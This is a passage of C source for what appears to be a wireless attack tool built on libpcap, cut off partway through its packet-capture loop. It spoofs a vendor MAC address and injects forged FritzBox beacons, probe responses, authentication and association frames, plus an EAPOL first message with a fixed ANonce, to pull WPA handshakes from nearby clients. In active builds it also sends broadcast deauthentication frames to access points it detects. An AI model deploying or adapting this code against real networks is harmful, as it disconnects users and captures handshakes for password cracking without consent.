#define _GNU_SOURCE
#include <ctype.h>
#include <dirent.h>
#include <fcntl.h>
#include <ftw.h>
#include <libgen.h>
#include <signal.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>
#include <utime.h>
#include <time.h>
#include <pcap.h>
#include <linux/wireless.h>


#ifdef DOGPIOSUPPORT
#include <wiringPi.h>
#undef TRUE
#undef FALSE
#endif

#include "common.h"

/*===========================================================================*/
/* Definitionen */

#define APLISTESIZEMAX 1024

#define SENDPACKETSIZEMAX 0x1ff


struct aplist
{
 adr_t		addr_ap;
 int		deauthcount;
 uint8_t	essid_len;
 uint8_t	essid[32];
};
typedef struct aplist apl_t;
#define	APL_SIZE (sizeof(apl_t))


struct stalist
{
 adr_t		addr_ap;
 adr_t		addr_sta;
 int		deauthcount;
 uint8_t	essid_len;
 uint8_t	essid[32];
};
typedef struct stalist stal_t;
#define	STAL_SIZE (sizeof(stal_t))

/*===========================================================================*/
/* globale variablen */

pcap_t *pcapin = NULL;
pcap_dumper_t *pcapout = NULL;
uint8_t channel = 1;
uint16_t mysequencenr = 1;
int deauthmax = 2;

apl_t *apliste = NULL; 
stal_t *staliste = NULL; 

adr_t myaddr;
adr_t broadcast;
adr_t nullmac;

int myoui = 0;
int myap = 0;


char *interfacename = NULL;

/*===========================================================================*/
/* Konstante */

const int myvendor[] =
{
0x00006c, 0x000101, 0x00054f, 0x000578, 0x000b18, 0x000bf4, 0x000c53, 0x000d58, 
0x000da7, 0x000dc2, 0x000df2, 0x000e17, 0x000e22, 0x000e2a, 0x000eef, 0x000f09, 
0x0016b4, 0x001761, 0x001825, 0x002067, 0x00221c, 0x0022f1, 0x00234a, 0x00238c, 
0x0023f7, 0x002419, 0x0024fb, 0x00259d, 0x0025df, 0x00269f, 0x005047, 0x005079, 
0x0050c7, 0x0084ed, 0x0086a0, 0x00a054, 0x00a085, 0x00bb3a, 0x00cb00, 0x0418b6, 
0x0c8112, 0x100000, 0x10ae60, 0x10b713, 0x1100aa, 0x111111, 0x140708, 0x146e0a, 
0x18421d, 0x1cf4ca, 0x205b2a, 0x20d160, 0x24336c, 0x24bf74, 0x28ef01, 0x3cb87a, 
0x487604, 0x48f317, 0x50e14a, 0x544e45, 0x580943, 0x586ed6, 0x5c6b4f, 0x609620, 
0x68e166, 0x706f81, 0x78f944, 0x7ce4aa, 0x8c8401, 0x8ce748, 0x906f18, 0x980ee4, 
0x9c93e4, 0xa468bc, 0xa4a6a9, 0xacde48, 0xb025aa, 0xb0ece1, 0xb0febd, 0xb4e1eb, 
0xc02250, 0xc8aacc, 0xd85dfb, 0xdc7014, 0xe00db9, 0xe0cb1d, 0xe80410, 0xf04f7c, 
0xf0a225, 0xfcc233
};
#define MYVENDOR_SIZE sizeof(myvendor)

const uint8_t hdradiotap[] =
{
 0x00, 0x00, // <-- radiotap version
 0x0c, 0x00, // <- radiotap header length
 0x04, 0x80, 0x00, 0x00, // <-- bitmap
 0x02, // <-- rate
 0x00, // <-- padding for natural alignment
 0x18, 0x00, // <-- TX flags
};
#define HDRRT_SIZE sizeof(hdradiotap)


/* Fritzbox 3272 Beacon */
uint8_t beaconfb3272[] =
{
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24,
0x03, 0x01, 0x0b, //channel
0x05, 0x04, 0x00, 0x01, 0x00, 0x00,
0x07, 0x06, 0x44, 0x45, 0x20, 0x01, 0x0d, 0x14,
0x2a, 0x01, 0x00,
0x32, 0x04, 0x30, 0x48, 0x60, 0x6c,
0x2d, 0x1a, 0xef, 0x11, 0x1b, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x04, 0x06, 0xe6, 0x47, 0x0d, 0x00,
0x3d, 0x16, 0x0b, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x4a, 0x0e, 0x14, 0x00, 0x0a, 0x00, 0x2c, 0x01, 0xc8, 0x00, 0x14, 0x00, 0x05, 0x00, 0x19, 0x00,
0x7f, 0x08, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,
0xdd, 0x18, 0x00, 0x50, 0xf2, 0x02, 0x01, 0x01, 0x00, 0x00, 0x03, 0xa4, 0x00, 0x00, 0x27, 0xa4, 0x00, 0x00, 0x42, 0x43, 0x5e, 0x00, 0x62, 0x32, 0x2f, 0x00,
0xdd, 0x09, 0x00, 0x03, 0x7f, 0x01, 0x01, 0x00, 0x00, 0xff, 0x7f,
0xdd, 0x0c, 0x00, 0x04, 0x0e, 0x01, 0x01, 0x02, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
0x30, 0x14, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x02, 0x00, 0x00,
0xdd, 0x18, 0x00, 0x50, 0xf2, 0x04, 0x10, 0x4a, 0x00, 0x01, 0x10, 0x10, 0x44, 0x00, 0x01, 0x02, 0x10, 0x49, 0x00, 0x06, 0x00, 0x37, 0x2a, 0x00, 0x01, 0x20
};
#define FB3272BEACON_SIZE sizeof(beaconfb3272)

/* Fritzbox 3272 Proberesponse*/
uint8_t proberesponsefb3272[] =
{
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24,
0x03, 0x01, 0x0b,
0x07, 0x06, 0x44, 0x45, 0x20, 0x01, 0x0d, 0x14,
0x2a, 0x01, 0x00,
0x32, 0x04, 0x30, 0x48, 0x60, 0x6c,
0x2d, 0x1a, 0xef, 0x11, 0x1b, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x04, 0x06, 0xe6, 0x47, 0x0d, 0x00,
0x3d, 0x16, 0x0b, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x4a, 0x0e, 0x14, 0x00, 0x0a, 0x00, 0x2c, 0x01, 0xc8, 0x00, 0x14, 0x00, 0x05, 0x00, 0x19, 0x00,
0x7f, 0x08, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,
0xdd, 0x18, 0x00, 0x50, 0xf2, 0x02, 0x01, 0x01, 0x00, 0x00, 0x03, 0xa4, 0x00, 0x00, 0x27, 0xa4, 0x00, 0x00, 0x42, 0x43, 0x5e, 0x00, 0x62, 0x32, 0x2f, 0x00,
0xdd, 0x09, 0x00, 0x03, 0x7f, 0x01, 0x01, 0x00, 0x00, 0xff, 0x7f,
0xdd, 0x0c, 0x00, 0x04, 0x0e, 0x01, 0x01, 0x02, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
0x30, 0x14, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x02, 0x00, 0x00,
0xdd, 0x6f, 0x00, 0x50, 0xf2, 0x04, 0x10, 0x4a, 0x00, 0x01, 0x10, 0x10, 0x44, 0x00, 0x01, 0x02, 0x10, 0x3b, 0x00, 0x01, 0x03, 0x10, 0x47, 0x00, 0x10, 0xe1, 0x88, 0x94,
0x6e, 0x88, 0x55, 0xf6, 0xb5, 0xef, 0xef, 0x34, 0x81, 0xc4, 0xcb, 0xb5, 0x30, 0x10, 0x21, 0x00, 0x03, 0x41, 0x56, 0x4d, 0x10, 0x23, 0x00, 0x04, 0x46, 0x42, 0x6f, 0x78,
0x10, 0x24, 0x00, 0x04, 0x30, 0x30, 0x30, 0x30, 0x10, 0x42, 0x00, 0x04, 0x30, 0x30, 0x30, 0x30, 0x10, 0x54, 0x00, 0x08, 0x00, 0x06, 0x00, 0x50, 0xf2, 0x04, 0x00, 0x01,
0x10, 0x11, 0x00, 0x04, 0x46, 0x42, 0x6f, 0x78, 0x10, 0x08, 0x00, 0x02, 0x23, 0x88, 0x10, 0x3c, 0x00, 0x01, 0x01, 0x10, 0x49, 0x00, 0x06, 0x00, 0x37, 0x2a, 0x00, 0x01,
0x20
};
#define FB3272PROBERESPONSE_SIZE sizeof(proberesponsefb3272)

uint8_t authenticationframe[] =
{
0x00, 0x00, 0x02, 0x00, 0x00, 0x00
};
#define AUTHENTICATION_SIZE sizeof(authenticationframe)


const uint8_t anonce[] =
{
0xaa, 0xaa, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8e,
0x02, 0x03, 0x00, 0x5f, 0x02, 0x00, 0x8a, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xf7,
0x00, 0x68, 0x20, 0x09, 0xe2, 0x1f, 0x0e, 0xbc, 0xe5, 0x62, 0xb9, 0x06, 0x5b, 0x54, 0x89, 0x79,
0x09, 0x9a, 0x65, 0x52, 0x86, 0xc0, 0x77, 0xea, 0x28, 0x2f, 0x6a, 0xaf, 0x13, 0x8e, 0x50, 0xcd,
0xb9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00
};
#define ANONCE_SIZE sizeof(anonce)


const uint8_t associationresponse[] =
{
0x01, 0x08, 0x82, 0x84, 0x8b, 0x0c, 0x12, 0x96, 0x18, 0x24,
0x32, 0x04, 0x30, 0x48, 0x60, 0x6c,
0x2d, 0x1a, 0xaf, 0x01, 0x1b, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x04, 0x06, 0xe6, 0x47, 0x0d, 0x00,
0x3d, 0x16, 0x0b, 0x0f, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x4a, 0x0e, 0x14, 0x00, 0x0a, 0x00, 0x2c, 0x01, 0xc8, 0x00, 0x14, 0x00, 0x05, 0x00, 0x19, 0x00,
0x7f, 0x08, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,
0xdd, 0x18, 0x00, 0x50, 0xf2, 0x02, 0x01, 0x01, 0x00, 0x00, 0x03, 0xa4, 0x00, 0x00, 0x27, 0xa4, 0x00, 0x00, 0x42, 0x43, 0x5e, 0x00, 0x62, 0x32, 0x2f, 0x00
};
#define ASSOCRESP_SIZE sizeof(associationresponse)
/*===========================================================================*/
int initgloballists()
{
int c;
apl_t * zeiger;
stal_t * zeigersta;
myap = rand() & 0xffffff;
if(myoui == 0)
	myoui = myvendor[rand() % ((MYVENDOR_SIZE / sizeof(int))-1)];

memset(&myaddr, 0, 6);
myaddr.addr[5] = myap & 0xff;
myaddr.addr[4] = (myap >> 8) & 0xff;
myaddr.addr[3] = (myap >> 16) & 0xff;
myaddr.addr[2] = myoui & 0xff;
myaddr.addr[1] = (myoui >> 8) & 0xff;
myaddr.addr[0] = (myoui >> 16) & 0xff;

memset(&broadcast, 0, 6);
broadcast.addr[5] = 0xff;
broadcast.addr[4] = 0xff;
broadcast.addr[3] = 0xff;
broadcast.addr[2] = 0xff;
broadcast.addr[1] = 0xff;
broadcast.addr[0] = 0xff;

memset(&nullmac, 0, 6);

if((apliste = malloc(APLISTESIZEMAX * APL_SIZE)) == NULL)
	return FALSE;
memset(apliste, 0, APLISTESIZEMAX * APL_SIZE);

if((staliste = malloc(APLISTESIZEMAX * STAL_SIZE)) == NULL)
	return FALSE;
memset(staliste, 0, APLISTESIZEMAX * STAL_SIZE);

zeiger = apliste;
for(c = 0; c < APLISTESIZEMAX; c++)
	{
	zeiger->deauthcount = deauthmax;
	zeiger++;
	}	

zeigersta = staliste;
for(c = 0; c < APLISTESIZEMAX; c++)
	{
	zeigersta->deauthcount = deauthmax;
	zeigersta++;
	}	

return TRUE;
}
/*===========================================================================*/
void printaddr(const uint8_t *macaddr1, const uint8_t *macaddr2, int destflag)
{
int c;

fprintf(stdout, "%02d ", channel);

for (c = 0; c < 6; c++)
	printf("%02x", macaddr1[c]);

if(destflag == TRUE)
	printf(" <- ");
else
	printf(" -> ");

for (c = 0; c < 6; c++)
	printf("%02x", macaddr2[c]);

printf(" ");

return;
}
/*===========================================================================*/
void sendbeacon(uint8_t channel, uint8_t *macaddr2, uint8_t essid_len, uint8_t **essid)
{
struct timeval tv1;
int pcapstatus;
mac_t grundframe;
beacon_t beacontsframe;
essid_t essidframe;

uint8_t sendpacket[SENDPACKETSIZEMAX];

memset(&grundframe, 0, MAC_SIZE_NORM);
grundframe.type = MAC_TYPE_MGMT;
grundframe.subtype = MAC_ST_BEACON;
grundframe.duration = 0;
memcpy(grundframe.addr1.addr, broadcast.addr, 6);
memcpy(grundframe.addr2.addr, macaddr2, 6);
memcpy(grundframe.addr3.addr, macaddr2, 6);
grundframe.sequence = htole16(mysequencenr++ << 4);

gettimeofday( &tv1,  NULL );
beacontsframe.beacon_timestamp = htole64(tv1.tv_sec*1000000UL + tv1.tv_usec);
beacontsframe.beacon_interval = 0x0064;
beacontsframe.beacon_capabilities = 0x431;

essidframe.info_essid = 0;
essidframe.info_essid_len = essid_len;

memcpy(sendpacket, hdradiotap, HDRRT_SIZE);
memcpy(sendpacket +HDRRT_SIZE, &grundframe, MAC_SIZE_NORM);
memcpy(sendpacket +HDRRT_SIZE +MAC_SIZE_NORM, &beacontsframe, BEACONINFO_SIZE);
memcpy(sendpacket +HDRRT_SIZE +MAC_SIZE_NORM +BEACONINFO_SIZE, &essidframe, ESSIDINFO_SIZE);
memcpy(sendpacket +HDRRT_SIZE +MAC_SIZE_NORM +BEACONINFO_SIZE +ESSIDINFO_SIZE, essid, essid_len);
memcpy(sendpacket +HDRRT_SIZE +MAC_SIZE_NORM +BEACONINFO_SIZE +ESSIDINFO_SIZE +essid_len, beaconfb3272, FB3272BEACON_SIZE);

sendpacket[HDRRT_SIZE +MAC_SIZE_NORM +BEACONINFO_SIZE +ESSIDINFO_SIZE +essid_len +12] = channel;

pcapstatus = pcap_inject(pcapin, &sendpacket, +HDRRT_SIZE +MAC_SIZE_NORM +BEACONINFO_SIZE +ESSIDINFO_SIZE +essid_len +FB3272BEACON_SIZE);
if(pcapstatus == -1)
	{
#ifdef DOGPIOSUPPORT
	system("reboot");
#endif

	fprintf(stderr, "error while sending beacon %s \n", pcap_geterr(pcapin));
	}
mysequencenr++;
if(mysequencenr > 9999)
	mysequencenr = 1;
return;
}
/*===========================================================================*/
void sendproberesponse(uint8_t channel, uint8_t *macaddr1, uint8_t *macaddr2, uint8_t essid_len, uint8_t **essid)
{
struct timeval tv1;
int pcapstatus;
mac_t grundframe;
beacon_t beacontsframe;
essid_t essidframe;

uint8_t sendpacket[SENDPACKETSIZEMAX];

memset(&grundframe, 0, MAC_SIZE_NORM);
grundframe.type = MAC_TYPE_MGMT;
grundframe.subtype = MAC_ST_PROBE_RESP;
grundframe.duration = 0x013a;
memcpy(grundframe.addr1.addr, macaddr1, 6);
memcpy(grundframe.addr2.addr, macaddr2, 6);
memcpy(grundframe.addr3.addr, macaddr2, 6);
grundframe.sequence = htole16(mysequencenr++ << 4);

gettimeofday( &tv1,  NULL );
beacontsframe.beacon_timestamp = htole64(tv1.tv_sec*1000000UL + tv1.tv_usec);
beacontsframe.beacon_interval = 0x0064;
beacontsframe.beacon_capabilities = 0x431;

essidframe.info_essid = 0;
essidframe.info_essid_len = essid_len;

memcpy(sendpacket, hdradiotap, HDRRT_SIZE);
memcpy(sendpacket +HDRRT_SIZE, &grundframe, MAC_SIZE_NORM);
memcpy(sendpacket +HDRRT_SIZE +MAC_SIZE_NORM, &beacontsframe, BEACONINFO_SIZE);
memcpy(sendpacket +HDRRT_SIZE +MAC_SIZE_NORM +BEACONINFO_SIZE, &essidframe, ESSIDINFO_SIZE);
memcpy(sendpacket +HDRRT_SIZE +MAC_SIZE_NORM +BEACONINFO_SIZE +ESSIDINFO_SIZE, essid, essid_len);
memcpy(sendpacket +HDRRT_SIZE +MAC_SIZE_NORM +BEACONINFO_SIZE +ESSIDINFO_SIZE +essid_len, proberesponsefb3272, FB3272PROBERESPONSE_SIZE);

sendpacket[HDRRT_SIZE +MAC_SIZE_NORM +BEACONINFO_SIZE +ESSIDINFO_SIZE +essid_len +12] = channel;

pcapstatus = pcap_inject(pcapin, &sendpacket, +HDRRT_SIZE +MAC_SIZE_NORM +BEACONINFO_SIZE +ESSIDINFO_SIZE +essid_len +FB3272PROBERESPONSE_SIZE);
if(pcapstatus == -1)
	{
#ifdef DOGPIOSUPPORT
	system("reboot");
#endif
	fprintf(stderr, "error while sending probe response %s \n", pcap_geterr(pcapin));
	}
mysequencenr++;
if(mysequencenr > 9999)
	mysequencenr = 1;
return;
}
/*===========================================================================*/
void sendauthentication(uint8_t *macaddr1, uint8_t *macaddr2)
{
mac_t grundframe;
int pcapstatus;

uint8_t sendpacket[SENDPACKETSIZEMAX];

memset(&grundframe, 0, MAC_SIZE_NORM);
grundframe.type = MAC_TYPE_MGMT;
grundframe.subtype = MAC_ST_AUTH;
grundframe.duration = 0x013a;
memcpy(grundframe.addr1.addr, macaddr1, 6);
memcpy(grundframe.addr2.addr, macaddr2, 6);
memcpy(grundframe.addr3.addr, macaddr2, 6);
grundframe.sequence = htole16(mysequencenr++ << 4);

memcpy(sendpacket, hdradiotap, HDRRT_SIZE);
memcpy(sendpacket +HDRRT_SIZE, &grundframe, MAC_SIZE_NORM);
memcpy(sendpacket +HDRRT_SIZE +MAC_SIZE_NORM, &authenticationframe, AUTHENTICATION_SIZE);

pcapstatus = pcap_inject(pcapin, &sendpacket, HDRRT_SIZE +MAC_SIZE_NORM +AUTHENTICATION_SIZE);

if(pcapstatus == -1)
	{
#ifdef DOGPIOSUPPORT
	system("reboot");
#endif
	fprintf(stderr, "error while sending authentication %s \n", pcap_geterr(pcapin));
	}
mysequencenr++;
if(mysequencenr > 9999)
	mysequencenr = 1;
return;
}
/*===========================================================================*/
void sendacknowledgement(uint8_t *macaddr1)
{
mac_t grundframe;
int pcapstatus;

uint8_t sendpacket[SENDPACKETSIZEMAX];

memset(&grundframe, 0, MAC_SIZE_NORM);
grundframe.type = MAC_TYPE_CTRL;
grundframe.subtype = MAC_ST_ACK;
grundframe.duration = 0;
memcpy(grundframe.addr1.addr, macaddr1, 6);

memcpy(sendpacket, hdradiotap, HDRRT_SIZE);
memcpy(sendpacket +HDRRT_SIZE, &grundframe, MAC_SIZE_ACK);

pcapstatus = pcap_inject(pcapin, &sendpacket, HDRRT_SIZE +MAC_SIZE_ACK);
if(pcapstatus == -1)
	{
#ifdef DOGPIOSUPPORT
	system("reboot");
#endif
	fprintf(stderr, "error while sending acknowledgement %s \n", pcap_geterr(pcapin));
	}
return;
}
/*===========================================================================*/
void sendassociationresponse(uint8_t dart, uint8_t *macaddr1, uint8_t *macaddr2)
{
int pcapstatus;
mac_t grundframe;
assocres_t associationframe;

uint8_t sendpacket[SENDPACKETSIZEMAX];

memset(&grundframe, 0, MAC_SIZE_NORM);


memset(&grundframe, 0, MAC_SIZE_NORM);
grundframe.type = MAC_TYPE_MGMT;
grundframe.subtype = dart;
grundframe.duration = 0x013a;
memcpy(grundframe.addr1.addr, macaddr1, 6);
memcpy(grundframe.addr2.addr, macaddr2, 6);
memcpy(grundframe.addr3.addr, macaddr2, 6);
grundframe.sequence = htole16(mysequencenr++ << 4);

associationframe.ap_capabilities = 0x0431;
associationframe.ap_status = 0;
associationframe.ap_associd = 1;

memcpy(&sendpacket, hdradiotap, HDRRT_SIZE);
memcpy(sendpacket +HDRRT_SIZE, &grundframe, MAC_SIZE_NORM);
memcpy(sendpacket +HDRRT_SIZE +MAC_SIZE_NORM, &associationframe, ASSOCIATIONRESF_SIZE);

memcpy(sendpacket +HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONRESF_SIZE, &associationresponse, ASSOCRESP_SIZE);

pcapstatus = pcap_inject(pcapin, &sendpacket, +HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONRESF_SIZE +ASSOCRESP_SIZE);
if(pcapstatus == -1)
	{
#ifdef DOGPIOSUPPORT
	system("reboot");
#endif
	fprintf(stderr, "error while sending associationresponce %s \n", pcap_geterr(pcapin));
	}
mysequencenr++;
if(mysequencenr > 9999)
	mysequencenr = 1;

return;
}
/*===========================================================================*/
void sendkey1(uint8_t *macaddr1, uint8_t *macaddr2)
{
int pcapstatus;
mac_t grundframe;
qos_t qosframe;

uint8_t sendpacket[SENDPACKETSIZEMAX];

memset(&grundframe, 0, MAC_SIZE_NORM);
memset(&qosframe, 0, QOS_SIZE);

grundframe.type = MAC_TYPE_DATA;
grundframe.subtype = MAC_ST_QOSDATA;
grundframe.from_ds = 1;
grundframe.duration = 0x3a01;
memcpy(grundframe.addr1.addr, macaddr1, 6);
memcpy(grundframe.addr2.addr, macaddr2, 6);
memcpy(grundframe.addr3.addr, macaddr2, 6);

qosframe.control = 0;
qosframe.flags = 0;

memcpy(sendpacket, hdradiotap, HDRRT_SIZE);
memcpy(sendpacket +HDRRT_SIZE, &grundframe, MAC_SIZE_NORM);
memcpy(sendpacket +HDRRT_SIZE +MAC_SIZE_NORM, &qosframe, QOS_SIZE);
memcpy(sendpacket +HDRRT_SIZE +MAC_SIZE_NORM +QOS_SIZE, &anonce, ANONCE_SIZE);

pcapstatus = pcap_inject(pcapin, &sendpacket, +HDRRT_SIZE +MAC_SIZE_NORM +QOS_SIZE +ANONCE_SIZE);
if(pcapstatus == -1)
	{
#ifdef DOGPIOSUPPORT
	system("reboot");
#endif
	fprintf(stderr, "error while sending key 1 %s \n", pcap_geterr(pcapin));
	}
return;
}
/*===========================================================================*/
void senddeauth(uint8_t dart, uint8_t reason, uint8_t *macaddr1, uint8_t *macaddr2)
{
int pcapstatus;
mac_t grundframe;
uint8_t sendpacket[SENDPACKETSIZEMAX];

if((memcmp(macaddr1, &myaddr, 3) == 0) || (memcmp(macaddr2, &myaddr, 3) == 0))
	return;

memset(&grundframe, 0, MAC_SIZE_NORM);
grundframe.type = MAC_TYPE_MGMT;
grundframe.subtype = dart;
grundframe.duration = 0x013a;
memcpy(grundframe.addr1.addr, macaddr1, 6);
memcpy(grundframe.addr2.addr, macaddr2, 6);
memcpy(grundframe.addr3.addr, macaddr2, 6);
grundframe.sequence = htole16(mysequencenr++ << 4);
memcpy(sendpacket, hdradiotap, HDRRT_SIZE);
memcpy(sendpacket + HDRRT_SIZE, &grundframe, MAC_SIZE_NORM);
sendpacket[HDRRT_SIZE +MAC_SIZE_NORM] = reason;
sendpacket[HDRRT_SIZE +MAC_SIZE_NORM +1] = 0;
pcapstatus = pcap_inject(pcapin, &sendpacket, HDRRT_SIZE + MAC_SIZE_NORM +2);
if(pcapstatus == -1)
	{
#ifdef DOGPIOSUPPORT
	system("reboot");
#endif
	fprintf(stderr, "error while sending deauthentication %s \n", pcap_geterr(pcapin));
	}

grundframe.retry = 1;
memcpy(sendpacket +sizeof(hdradiotap), &grundframe, MAC_SIZE_NORM);

pcapstatus = pcap_inject(pcapin, &sendpacket, HDRRT_SIZE + MAC_SIZE_NORM +2);
if(pcapstatus == -1)
	{
#ifdef DOGPIOSUPPORT
	system("reboot");
#endif
	fprintf(stderr, "error while sending retry deauthentication %s \n", pcap_geterr(pcapin));
	}

mysequencenr++;
if(mysequencenr > 9999)
	mysequencenr = 1;
return ;
}
/*===========================================================================*/
int checkmynonce(eap_t *eap)
{
if(memcmp(eap->nonce, &mynonce, 32) == 0)
	return TRUE;
return FALSE;
}
/*===========================================================================*/
unsigned long long int getreplaycount(eap_t *eap)
{
unsigned long long int replaycount = 0;

replaycount = be64toh(eap->replaycount);
return replaycount;
}
/*===========================================================================*/
uint8_t geteapkey(eap_t *eap)
{
uint16_t keyinfo;
int eapkey = 0;

keyinfo = (((eap->keyinfo & 0xff) << 8) | (eap->keyinfo >> 8));
if (keyinfo & WPA_KEY_INFO_ACK)
	{
	if(keyinfo & WPA_KEY_INFO_INSTALL)
		{
		/* handshake 3 */
		eapkey = 3;
		}
	else
		{
		/* handshake 1 */
		eapkey = 1;
		}
	}
else
	{
	if(keyinfo & WPA_KEY_INFO_SECURE)
		{
		/* handshake 4 */
		eapkey = 4;
		}
	else
		{
		/* handshake 2 */
		eapkey = 2;
		}
	}
return eapkey;
}
/*===========================================================================*/
int handlestaframes(uint8_t *mac_ap, uint8_t *mac_sta, uint8_t essid_len, uint8_t **essidname)
{
stal_t *zeiger;
int c;

zeiger = staliste;
for(c = 0; c < APLISTESIZEMAX; c++)
	{
	if((memcmp(mac_ap, zeiger->addr_ap.addr, 6) == 0) && (memcmp(mac_sta, zeiger->addr_sta.addr, 6) == 0) && (zeiger->essid_len == essid_len) && (memcmp(zeiger->essid, essidname, essid_len) == 0))
		{
		return TRUE;
		}
	if(memcmp(&nullmac.addr, zeiger->addr_sta.addr, 6) == 0)
		break;
	zeiger++;
	}

if(c >= APLISTESIZEMAX)
	{
	zeiger = staliste;
	memset(staliste, 0, APLISTESIZEMAX * STAL_SIZE);
	}

memcpy(zeiger->addr_ap.addr, mac_ap, 6);
memcpy(zeiger->addr_sta.addr, mac_sta, 6);
zeiger->essid_len = essid_len;
memcpy(zeiger->essid, essidname, essid_len);
return FALSE;
}
/*===========================================================================*/
int handleapframes(uint8_t *mac_ap, uint8_t essid_len, uint8_t **essidname)
{
apl_t *zeiger;
int c;

zeiger = apliste;
for(c = 0; c < APLISTESIZEMAX; c++)
	{
	if((memcmp(mac_ap, zeiger->addr_ap.addr, 6) == 0) && (zeiger->essid_len == essid_len) && (memcmp(zeiger->essid, essidname, essid_len) == 0))
		{
#ifdef DOACTIVE
		if(zeiger->deauthcount > 0)
			{
			senddeauth(MAC_ST_DEAUTH, WLAN_REASON_PREV_AUTH_NOT_VALID, broadcast.addr, zeiger->addr_ap.addr);
			zeiger->deauthcount -= 1;
			}
#endif
		return TRUE;
		}
	if(memcmp(&nullmac.addr, zeiger->addr_ap.addr, 6) == 0)
		break;
	zeiger++;
	}

if(c >= APLISTESIZEMAX)
	{
	zeiger = apliste;
	memset(apliste, 0, APLISTESIZEMAX * APL_SIZE);
	}

memcpy(zeiger->addr_ap.addr, mac_ap, 6);
zeiger->essid_len = essid_len;
memcpy(zeiger->essid, essidname, essid_len);
return FALSE;
}
/*===========================================================================*/
void sigalarm(int signum)
{
if(signum == SIGALRM)
	{
#ifdef DOGPIOSUPPORT
	digitalWrite(0, HIGH);
	delay (25);
	digitalWrite(0, LOW);
	delay (25);
	if(digitalRead(7) == 1)
		{
		digitalWrite(0, HIGH);
		pcap_dump_close(pcapout);
		pcap_close(pcapin);
		system("poweroff");
		}
#endif

	pcap_breakloop(pcapin);
	alarm(5);
	}
return;
}
/*===========================================================================*/
void programmende(int signum)
{
if((signum == SIGINT) || (signum == SIGTERM) || (signum == SIGKILL))
	{
	pcap_dump_flush(pcapout);
	pcap_dump_close(pcapout);
	pcap_close(pcapin);
	printf("\nprogram terminated...\n");
	exit (EXIT_SUCCESS);
	}
return;
}
/*===========================================================================*/
void setchannel()
{
struct iwreq wrq;

int sock = 0;
int result = 0;
memset(&wrq, 0, sizeof(struct iwreq));
strncpy(wrq.ifr_name, interfacename , IFNAMSIZ);
if((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0)
	{
        fprintf(stderr, "socket open for ioctl() on '%s' failed with '%d'\n", interfacename, sock);
	programmende(SIGINT);
	}

wrq.u.freq.m = channel;
wrq.u.freq.e = 0;
wrq.u.freq.flags = IW_FREQ_FIXED;
if(ioctl(sock, SIOCSIWFREQ, &wrq) < 0)
	{
	usleep(100);
	if((result = ioctl(sock, SIOCSIWFREQ, &wrq)) < 0)
		{
		fprintf(stderr, "ioctl(SIOCSIWFREQ) on '%s' failed with '%d'\n", interfacename, result);
		fprintf(stderr, "unable to set channel on '%s', exiting\n", interfacename);
		programmende(SIGINT);
		}
	}
close(sock);
return;
}
/*===========================================================================*/
void pcaploop(int has_rth, int staytime)
{
const uint8_t *packet = NULL;
const uint8_t *h80211 = NULL;
struct pcap_pkthdr *pkh;
rth_t *rth = NULL;
mac_t *macf = NULL;
eap_t *eap = NULL;
essid_t *essidf;
uint8_t	*payload = NULL;
int pcapstatus = 1;
int macl = 0;
int fcsl = 0;
int staytimecount = staytime;
uint8_t field = 0;


#ifdef DOACTIVE
 uint8_t mkey = 0;
 authf_t *authenticationreq = NULL;
#else
  #ifdef DOSTATUS
	uint8_t mkey = 0;
	authf_t *authenticationreq = NULL;
  #endif
#endif

#ifdef DOACTIVE
apl_t *zeiger;
stal_t *zeigersta;
int c;
#endif

#ifdef DOSTATUS
unsigned long long int replaycount;
eapext_t *eapext = NULL;
#endif

#ifdef DOSTATUS
char essidstr[34];
#endif


